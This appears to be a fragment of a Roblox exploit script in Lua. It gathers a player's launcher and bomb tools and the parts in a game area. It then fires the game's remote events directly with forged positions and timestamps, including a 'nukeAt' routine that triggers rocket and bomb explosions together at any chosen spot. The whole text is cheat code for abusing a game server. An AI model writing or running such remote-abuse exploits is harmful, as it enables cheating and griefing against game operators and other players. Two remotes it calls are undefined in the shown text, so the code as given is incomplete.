-- ================================================
-- GET LAUNCHER PARTS
-- ================================================
local function getLauncher()
    local char = LocalPlayer.Character
    if not char then return nil end
    local launcher = char:FindFirstChild("Launcher")
    if not launcher then return nil end
    return {
        stats  = launcher:FindFirstChild("Stats"),
        rocket = launcher:FindFirstChild("Assets") and launcher.Assets:FindFirstChild("Rocket"),
        handle = launcher:FindFirstChild("Handle"),
        boom   = launcher:FindFirstChild("Assets")
            and launcher.Assets:FindFirstChild("Rocket")
            and launcher.Assets.Rocket:FindFirstChild("Boom"),
    }
end

-- ================================================
-- GET ALL BRICKS IN AREA
-- ================================================
local function getBricksInArea(areaName)
    local bricks = {}
    local areasFolder = Workspace:FindFirstChild("Areas")
    if not areasFolder then return bricks end
    local area = areasFolder:FindFirstChild(areaName)
    if not area then return bricks end

    for _, obj in ipairs(area:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name ~= "Baseplate" then
            table.insert(bricks, obj)
        end
    end
    return bricks
end

local BombRemote   = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("clientServerBomb")
local ExplodeBombRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("explodeBomb")

-- ================================================
-- GET BOMB PARTS
-- ================================================
local function getBomb()
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    local bomb = (bp and bp:FindFirstChild("Bomb"))
        or (char and char:FindFirstChild("Bomb"))
    if not bomb then return nil end
    return {
        stats  = bomb:FindFirstChild("Stats"),
        handle = bomb:FindFirstChild("Handle"),
    }
end

-- ================================================
-- SHOOT + EXPLODE ON POSITION (Launcher)
-- ================================================
local function shootAt(pos)
    local launcher = getLauncher()
    if not launcher or not launcher.stats or not launcher.rocket or not launcher.handle or not launcher.boom then
        return false
    end
    local timestamp = tick()
    local cf = CFrame.new(pos)
    pcall(function()
        RocketRemote:FireServer(timestamp, launcher.stats, launcher.rocket, launcher.handle, cf, launcher.boom)
    end)
    pcall(function()
        ExplodeRemote:FireServer(timestamp, launcher.stats, Vector3.new(pos.X, pos.Y, pos.Z), launcher.boom)
    end)
    return true
end

-- ================================================
-- DROP BOMB ON POSITION
-- ================================================
local function dropBombAt(pos)
    local bomb = getBomb()
    if not bomb or not bomb.stats or not bomb.handle then return false end
    local timestamp = tick()
    pcall(function()
        BombRemote:FireServer(timestamp, bomb.stats, LocalPlayer, bomb.handle, bomb.handle, pos)
    end)
    pcall(function()
        ExplodeBombRemote:FireServer(timestamp, bomb.stats, pos)
    end)
    return true
end

-- ================================================
-- NUKE POSITION (Launcher + Bomb simultaneously)
-- ================================================
local function nukeAt(pos)
    -- Fire both at same time in parallel
    task.spawn(function() shootAt(pos) end)
    task.spawn(function() dropBombAt(pos) end)
end

